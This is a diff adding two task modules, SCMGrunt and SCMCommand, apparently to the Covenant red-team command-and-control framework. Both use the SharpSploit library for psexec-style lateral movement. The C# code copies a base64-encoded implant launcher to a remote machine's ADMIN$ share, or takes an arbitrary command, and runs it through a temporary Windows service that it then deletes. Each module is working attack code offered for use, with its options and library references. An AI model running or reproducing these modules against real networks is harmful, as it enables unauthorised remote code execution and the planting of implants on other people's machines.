@@ -758,3 +758,227 @@
     EmbeddedResources: []
   ReferenceAssemblies: []
   EmbeddedResources: []
+- Name: SCMGrunt
+  Aliases:
+  - psexec
+  Author:
+    Name: Daniel Duggan
+    Handle: _RastaMouse
+    Link: https://twitter.com/_RastaMouse
+  Description: Execute a Grunt Launcher on a remote system using the Service Control Manager.
+  Help: This Task requires that the service be stopped and the service binary removed manually.
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: "using System;\nusing System.IO;\nusing System.Linq;\nusing SharpSploit.LateralMovement;\n\npublic static class Task\n{\n    public static string Execute(string ComputerName, string EncodedLauncher)\n    {       \n        try\n        {\n        	var randName = GenerateRandomString(8);\n            var remotePath = $@\"\\\\{ComputerName}\\ADMIN$\\{randName}.exe\";\n            \n        	File.WriteAllBytes(remotePath, Convert.FromBase64String(EncodedLauncher));\n            \n            if (SCM.CreateService(ComputerName, randName, \"\", $@\"C:\\Windows\\{randName}.exe\"))\n            {\n            	if (SCM.StartService(ComputerName, randName))\n                {\n                	if (SCM.DeleteService(ComputerName, randName))\n                    {\n                    	return $\"[+] Service {randName} created ({remotePath})\";\n                    }\n                	else { return \"[x] Failed to delete service\"; }\n                }\n                else { return \"[x] Failed to start service\"; }\n            }\n            else { return \"[x] Failed to create service\"; }\n        }\n        catch (Exception e) { return e.GetType().FullName + \": \" + e.Message + Environment.NewLine + e.StackTrace; }\n    }\n    private static string GenerateRandomString(int length)\n    {\n        var random = new Random();\n        const string chars = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\";\n        return new string(Enumerable.Repeat(chars, length)\n          .Select(s => s[random.Next(s.Length)]).ToArray());\n    }\n}"
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: ComputerName
+    Value: ''
+    DefaultValue: ''
+    Description: ComputerName to launch the Grunt on.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: Launcher
+    Value: ''
+    DefaultValue: ''
+    Description: Grunt Launcher to execute on the remote system.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries:
+  - Name: SharpSploit
+    Description: SharpSploit is a library for C# post-exploitation modules.
+    Location: SharpSploit\SharpSploit\
+    Language: CSharp
+    CompatibleDotNetVersions:
+    - Net35
+    - Net40
+    ReferenceAssemblies:
+    - Name: System.IdentityModel.dll
+      Location: net35\System.IdentityModel.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net40\System.Core.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.dll
+      Location: net40\System.DirectoryServices.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net40\System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40\System.dll
+      DotNetVersion: Net40
+    - Name: System.IdentityModel.dll
+      Location: net40\System.IdentityModel.dll
+      DotNetVersion: Net40
+    - Name: System.Management.Automation.dll
+      Location: net40\System.Management.Automation.dll
+      DotNetVersion: Net40
+    - Name: System.Management.dll
+      Location: net40\System.Management.dll
+      DotNetVersion: Net40
+    - Name: System.ServiceProcess.dll
+      Location: net40\System.ServiceProcess.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net40\mscorlib.dll
+      DotNetVersion: Net40
+    - Name: System.XML.dll
+      Location: net35\System.XML.dll
+      DotNetVersion: Net35
+    - Name: System.Windows.Forms.dll
+      Location: net35\System.Windows.Forms.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35\System.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net35\System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.dll
+      Location: net35\System.DirectoryServices.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net35\System.Core.dll
+      DotNetVersion: Net35
+    - Name: mscorlib.dll
+      Location: net35\mscorlib.dll
+      DotNetVersion: Net35
+    - Name: System.Management.Automation.dll
+      Location: net35\System.Management.Automation.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net35\System.Management.dll
+      DotNetVersion: Net35
+    - Name: System.ServiceProcess.dll
+      Location: net35\System.ServiceProcess.dll
+      DotNetVersion: Net35
+    - Name: System.Windows.Forms.dll
+      Location: net40\System.Windows.Forms.dll
+      DotNetVersion: Net40
+    - Name: System.XML.dll
+      Location: net40\System.XML.dll
+      DotNetVersion: Net40
+    EmbeddedResources: []
+  ReferenceAssemblies: []
+  EmbeddedResources: []
+- Name: SCMCommand
+  Aliases:
+  - psexec_cmd
+  Author:
+    Name: Daniel Duggan
+    Handle: _RastaMouse
+    Link: https://twitter.com/_RastaMouse
+  Description: Execute a command on a remote system using the Service Control Manager.
+  Help: ''
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: "using System;\nusing System.IO;\nusing System.Linq;\n\nusing SharpSploit.LateralMovement;\n\npublic static class Task\n{\n    public static string Execute(string ComputerName, string Command)\n    {\n    	var randName = GenerateRandomString(8);\n    \n        try\n        {\n			SCM.CreateService(ComputerName, randName, \"\", Command);\n            SCM.StartService(ComputerName, randName); // will almost always throw an exception as we're not using valid service binaries\n            SCM.DeleteService(ComputerName, randName);\n            \n            return $@\"[+] Service {randName} created ({Command})\";\n        }\n        catch (Exception e)\n        {\n        	if (e.Message.Contains(\"Cannot start service\"))\n            {\n            	SCM.DeleteService(ComputerName, randName);\n                return $@\"[+] Service {randName} created ({Command})\";\n            }\n            else\n            {\n        		return e.GetType().FullName + \": \" + e.Message + Environment.NewLine + e.StackTrace;\n            }\n        }\n    }\n    private static string GenerateRandomString(int length)\n    {\n        var random = new Random();\n        const string chars = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\";\n        return new string(Enumerable.Repeat(chars, length)\n          .Select(s => s[random.Next(s.Length)]).ToArray());\n    }\n}"
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: ComputerName
+    Value: ''
+    DefaultValue: ''
+    Description: ComputerName to launch the Command on.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: Command
+    Value: ''
+    DefaultValue: ''
+    Description: Command to execute on the remote system.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries:
+  - Name: SharpSploit
+    Description: SharpSploit is a library for C# post-exploitation modules.
+    Location: SharpSploit\SharpSploit\
+    Language: CSharp
+    CompatibleDotNetVersions:
+    - Net35
+    - Net40
+    ReferenceAssemblies:
+    - Name: System.IdentityModel.dll
+      Location: net35\System.IdentityModel.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net40\System.Core.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.dll
+      Location: net40\System.DirectoryServices.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net40\System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40\System.dll
+      DotNetVersion: Net40
+    - Name: System.IdentityModel.dll
+      Location: net40\System.IdentityModel.dll
+      DotNetVersion: Net40
+    - Name: System.Management.Automation.dll
+      Location: net40\System.Management.Automation.dll
+      DotNetVersion: Net40
+    - Name: System.Management.dll
+      Location: net40\System.Management.dll
+      DotNetVersion: Net40
+    - Name: System.ServiceProcess.dll
+      Location: net40\System.ServiceProcess.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net40\mscorlib.dll
+      DotNetVersion: Net40
+    - Name: System.XML.dll
+      Location: net35\System.XML.dll
+      DotNetVersion: Net35
+    - Name: System.Windows.Forms.dll
+      Location: net35\System.Windows.Forms.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35\System.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net35\System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.dll
+      Location: net35\System.DirectoryServices.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net35\System.Core.dll
+      DotNetVersion: Net35
+    - Name: mscorlib.dll
+      Location: net35\mscorlib.dll
+      DotNetVersion: Net35
+    - Name: System.Management.Automation.dll
+      Location: net35\System.Management.Automation.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net35\System.Management.dll
+      DotNetVersion: Net35
+    - Name: System.ServiceProcess.dll
+      Location: net35\System.ServiceProcess.dll
+      DotNetVersion: Net35
+    - Name: System.Windows.Forms.dll
+      Location: net40\System.Windows.Forms.dll
+      DotNetVersion: Net40
+    - Name: System.XML.dll
+      Location: net40\System.XML.dll
+      DotNetVersion: Net40
+    EmbeddedResources: []
+  ReferenceAssemblies: []
+  EmbeddedResources: []
